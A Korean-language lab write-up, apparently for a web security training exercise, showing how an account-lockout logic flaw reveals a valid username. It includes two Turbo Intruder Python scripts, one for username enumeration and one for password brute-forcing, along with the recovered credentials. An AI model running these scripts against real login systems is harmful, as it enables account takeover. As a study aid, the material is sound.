# 🚩Lab: Username enumeration via account lock

```text
This lab is vulnerable to username enumeration.
It uses account locking, but this contains a logic flaw.
To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
```

### 🔍 분석 및 공격 과정
1. 실제로 존재하는 계정이라면 일정횟수 이상을 시도시 계정이 잠긴다. 터보 인트루더에서 다음과 같은 스크립트를 작성하였다.
```python
import io

def queueRequests(target, wordlists):
  engine = RequestEngine(
      endpoint=target.endpoint,
      concurrentConnections=30,
      requestsPerConnection=100,
      pipeline=True,
      engine=Engine.BURP2,
  )
  with io.open(r"C:\Users\fjwle\Documents\bscp\id.txt", mode='r', encoding="utf-8") as f1:
    usernames = [i.strip() for i in f1 if i.strip()]
  incorrectPasswords = ["1235343", "5321", "12314", "235325", "1231235"]

  

  for username in usernames:
    for password in incorrectPasswords:
        engine.queue(target.req, [username, password])


def handleResponse(req, interesting):
  table.add(req)
```
2. table에서 확인 결과 `al`이 1분간 잠겼다. 따라서 실제로 존재하는 계정은 `al`.
3. username에 al을 고정하고 password brute-force를 진행.
```python
import io

def queueRequests(target, wordlists):
  engine = RequestEngine(
      endpoint=target.endpoint,
      concurrentConnections=50,
      requestsPerConnection=100,
      pipeline=True,
      engine=Engine.BURP2,
  )
  with io.open(r"C:\Users\fjwle\Documents\bscp\password.txt", mode='r', encoding="utf-8") as f:
    a = [i.strip() for i in f if i.strip()]

    

  for password in a:
    engine.queue(target.req, password)


def handleResponse(req, interesting):
  table.add(req)
```
4. 4번째 이후 시도에서는 계정이 잠겼다는 응답을 확인할 수 있었으나, 유일하게 응답이 다른 password 존재. `username=al&password=qwertyuiop`
5. solve
                        
### 💡 취약점 원리
 단지 계정 잠금만 구현되어 있어 brute-force로 실제로 존재하는 계정을 찾아낼 수 있었고, 계정이 잠긴 상태더라도 옳은 인증정보를 주었을 때 돌려주는 응답의 차이가 존재하여 계정과 패스워드를 찾아냄.
